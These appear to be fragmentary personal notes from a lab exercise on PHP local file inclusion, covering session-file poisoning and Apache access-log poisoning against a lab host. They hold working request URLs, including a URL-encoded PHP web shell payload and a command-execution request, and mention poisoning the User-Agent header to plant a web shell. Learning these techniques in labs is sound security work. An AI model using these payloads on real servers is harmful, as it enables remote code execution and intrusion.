...
We know that if we include any file that contains PHP code, it will get executed, as long as the vulnerable function has the `Execute` privileges.
...
saved in `/var/lib/php/sessions/` on Linux and in `C:\Windows\Temp\` on Windows
...
![[Pasted image 20260302205252.png]]

our `PHPSESSID` cookie value is `nhhv8i0o6ua4g88bkdl9u1fdsd`, so it should be stored at `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`.
...
```
http://154.57.164.65:32327/index.php?language=/var/lib/php/sessions/sess_bahoqi7lcjk0v3ve82vn6r07m6
```

![[Pasted image 20260302205437.png]]
...
![[Pasted image 20260302205738.png]]
![[Pasted image 20260302205751.png]]
...
```
http://154.57.164.65:32327/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```
![[Pasted image 20260302210040.png]]

```
http://154.57.164.65:32327/index.php?language=/var/lib/php/sessions/sess_bahoqi7lcjk0v3ve82vn6r07m6&cmd=id
```
![[Pasted image 20260302210059.png]]
...
```
http://154.57.164.65:32327/index.php?language=/var/log/apache2/access.log
```

![[Pasted image 20260302210603.png]]
...
![[Pasted image 20260302210940.png]]

![[Pasted image 20260302211032.png]]

We can see our poisoned  `User-Agent` header in the access log, lets get in a PHP web shell.
...
![[Pasted image 20260302211355.png]]

![[Pasted image 20260302211441.png]]
